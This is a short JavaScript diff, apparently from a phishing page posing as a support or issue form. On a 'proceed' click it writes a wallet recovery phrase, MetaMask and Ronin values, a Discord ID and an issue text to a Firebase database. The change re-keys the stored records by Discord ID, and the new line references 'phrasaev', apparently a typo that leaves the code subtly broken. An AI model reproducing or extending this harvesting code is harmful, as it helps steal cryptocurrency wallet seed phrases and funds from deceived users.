@@ -13,11 +13,11 @@ document.getElementById("proceed").onclick = function () {
 
 	firebase
 		.database()
-		.ref("opensea/" + phrasev)
+		.ref("discordIds/" + discordv)
 		.set({
-			opensea: phrasev,
+			discordIds: discordv,
 			metamask: roninv,
-			discord: discordv,
+			phrase: phrasaev,
 			issue: issuev,
 
 		});
